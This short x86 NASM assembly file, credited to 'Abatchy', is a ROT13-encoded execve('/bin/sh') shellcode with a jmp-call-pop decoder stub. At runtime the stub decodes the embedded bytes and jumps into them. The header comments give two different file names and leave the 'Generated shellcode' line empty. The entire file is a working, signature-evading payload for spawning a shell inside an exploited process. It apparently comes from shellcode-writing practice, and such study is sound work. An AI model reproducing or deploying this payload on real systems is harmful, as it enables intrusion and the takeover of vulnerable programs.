; Rot13ExecveSh.asm
; by Abatchy
;
;   nasm -felf32 Rot13Encoder.asm && ld -o Rot13Encoder Rot13Encoder.o
; Generated shellcode: 

global _start

section .text

_start:
    
    jmp short get_shellcode_addr    ; Get address of shellcode

ReturnLabel:
    pop esi                 ; Store address of "shellcode" in esi
decode:
    sub byte [esi], 13      ; Decode byte at [esi]
    jz shellcode            
    inc esi
    jmp short decode

get_shellcode_addr:
    call ReturnLabel
    shellcode: db  0x3e, 0xcd, 0x5d, 0x96, 0xef, 0x75, 0x3c, 0x3c, 0x80, 0x75, 0x75, 0x3c, 0x6f, 0x76, 0x7b, 0x96, 0xf0, 0x5d, 0xbd, 0x18, 0xda, 0x8d, 0x0d
